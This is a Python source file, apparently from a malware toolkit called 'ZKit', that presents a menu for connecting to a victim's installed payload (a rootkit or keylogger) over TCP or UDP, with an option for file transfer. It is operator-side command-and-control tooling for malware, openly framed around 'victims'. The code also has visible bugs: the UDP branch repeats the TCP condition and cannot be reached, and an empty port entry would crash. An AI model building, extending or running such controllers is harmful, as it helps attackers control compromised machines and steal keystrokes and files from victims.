"Talks to controllers"
import os
import core.lib.controllers.rootkit_controller as ctrl
from core.helper_core import Color, notify


def main():
    "Talks to controllers . gets info from user and lets user have fun"
    if os.name == 'nt':
        from colorama import init  # pylint: disable=C0415; # noqa
        init(convert=True)
    col = Color().GetColor
    red, green, blue, reset = col('red'), col('green'), col("blue"), col("reset")
    print("What Is The Victims PayLoad ?\n"
          + red + "{1}--> Rootkit\n"
          + green + "{2}--> KeyLogger*\n"
          + blue + "{000}--> Back To Main Menu\n" + reset)
    choice = str(input("..> "))
    if choice == "000":
        pass
    elif choice == "1":
        print("At The Time Of Creation Of Rootkit . ZKit Asked About A Connection Type "
              "What Was It ?\n"
              + red + "{1}--> TCP\n"
              + green + "{2}--> UDP\n"
              + blue + "{000}--> Back To Main Menu" + reset)
        choice = str(input("..> "))
        notify("question", "what port did you used ? left empty to use default (1534)")
        port = int(input("..> "))
        type_ = 'ft' if input(
            "Was the payload enchanted with file transfer (Y or N)").lower() == 'y' else 'rootkit'
        if choice == "000":
            pass
        elif choice == "1":
            ctrl.connect("TCP", port, type_)
        elif choice == "1":
            ctrl.connect("UDP", port, type_)
    else:
        notify("notify",
               "Invalid Input {" + "{}".format(choice) + "}")
